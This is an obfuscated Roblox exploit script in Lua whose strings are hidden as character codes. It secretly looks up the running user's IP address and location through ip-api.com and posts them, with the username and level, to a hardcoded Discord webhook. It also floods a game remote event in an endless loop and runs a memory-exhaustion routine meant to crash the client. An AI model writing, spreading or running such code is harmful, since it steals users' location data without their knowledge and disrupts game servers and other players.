--wearedvin obfuscator

local _0x1a2b3c=game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101)).Events[string.char(90,70,75,76,70,95,72)]
local _0x4d5e6f=game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer
local _0x7g8h9i=_0x4d5e6f.Name
local _0xabc123=string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,56,55,54,57,57,49,56,50,50,52,56,51,57,52,57,48,51,47,103,108,87,119,57,119,78,99,113,102,80,103,82,88,82,117,68,112,67,82,106,111,85,110,56,118,120,83,74,106,105,75,86,66,73,75,83,56,65,48,52,120,78,117,86,79,68,79,113,101,53,70,89,109,57,82,50,65,120,98,77,90,70,68,65,98,90,49)
local _0xdef456=_0x4d5e6f:FindFirstChild(string.char(108,101,97,100,101,114,115,116,97,116,115)) and _0x4d5e6f.leaderstats:FindFirstChild(string.char(76,101,118,101,108)) and _0x4d5e6f.leaderstats.Level.Value or string.char(85,110,107,110,111,119,110)
local _0x789xyz
local _0x0p1q2r={query=string.char(78,47,65),country=string.char(78,47,65),countryCode=string.char(78,47,65),region=string.char(78,47,65),regionName=string.char(78,47,65),city=string.char(78,47,65),zip=string.char(78,47,65),isp=string.char(78,47,65),org=string.char(78,47,65)}
if syn and syn.request then
    _0x789xyz=syn.request({Url=string.char(104,116,116,112,58,47,47,105,112,45,97,112,105,46,99,111,109,47,106,115,111,110),Method=string.char(71,69,84)})
    if _0x789xyz and _0x789xyz.Body then
        _0x0p1q2r=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):JSONDecode(_0x789xyz.Body)
    end
end
local _0x3s4t5u=string.format(string.char(96,96,96,85,115,101,114,58,32,37,115,10,76,101,118,101,108,58,32,37,115,10,73,80,58,32,37,115,10,67,111,117,110,116,114,121,58,32,37,115,10,67,111,117,110,116,114,121,32,67,111,100,101,58,32,37,115,10,82,101,103,105,111,110,58,32,37,115,10,82,101,103,105,111,110,32,78,97,109,101,58,32,37,115,10,67,105,116,121,58,32,37,115,10,90,105,112,99,111,100,101,58,32,37,115,10,73,83,80,58,32,37,115,10,79,114,103,58,32,37,115,96,96,96),_0x7g8h9i,_0xdef456,_0x0p1q2r.query,_0x0p1q2r.country,_0x0p1q2r.countryCode,_0x0p1q2r.region,_0x0p1q2r.regionName,_0x0p1q2r.city,_0x0p1q2r.zip,_0x0p1q2r.isp,_0x0p1q2r.org)
syn.request({Url=_0xabc123,Method=string.char(80,79,83,84),Headers={[string.char(67,111,110,116,101,110,116,45,84,121,112,101)]=string.char(97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110)},Body=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101)):JSONEncode({[string.char(99,111,110,116,101,110,116)]=_0x3s4t5u})})
local function _0x6v7w8x()
    local _0x9y0z1a=game:GetService(string.char(80,108,97,121,101,114,115)):GetPlayers()
    for _,_0x2b3c4d in pairs(_0x9y0z1a) do
        if _0x2b3c4d.Character and _0x2b3c4d.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116)) then
            return _0x2b3c4d
        end
    end
    return game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer
end
local function _0x5e6f7g()
    local _0x8h9i0j={}
    for _0x1k2l3m=1,2000000 do
        _0x8h9i0j[_0x1k2l3m]=string.rep(string.char(76,105,110,111,114,105,97,76,105,98),100000)
        local _0x4n5o6p={}
        for _0x7q8r9s=1,2000 do
            _0x4n5o6p[_0x7q8r9s]=string.rep(tostring(math.random(1,1000000)),3000)
        end
        _0x8h9i0j[_0x1k2l3m..string.char(115,117,98)]=_0x4n5o6p
    end
    return _0x8h9i0j
end
spawn(function()
    while true do
        local _0x3t4u5v=_0x6v7w8x()
        local _0x0w1x2y=_0x3t4u5v.Character and _0x3t4u5v.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116)) or _0x3t4u5v.Character.HumanoidRootPart
        local _0x6y7z8a=_0x0w1x2y.Position
        local _0x9b0c1d={Hitmarker={Fire=function() end}}
        local _0x2e3f4g=math.random(1,1000000)
        local _0x5h6i7j=CFrame.new(Vector3.new(0,0,0),_0x6y7z8a).LookVector
        _0x1a2b3c:FireServer(string.char(240,159,141,175),_0x9b0c1d,_0x2e3f4g,1,_0x0w1x2y,_0x6y7z8a,_0x5h6i7j)
        wait(0.001)
    end
end)
wait(5)
for _0x8k9l0m=1,100 do
    local _0x1n2o3p=_0x5e6f7g()
end
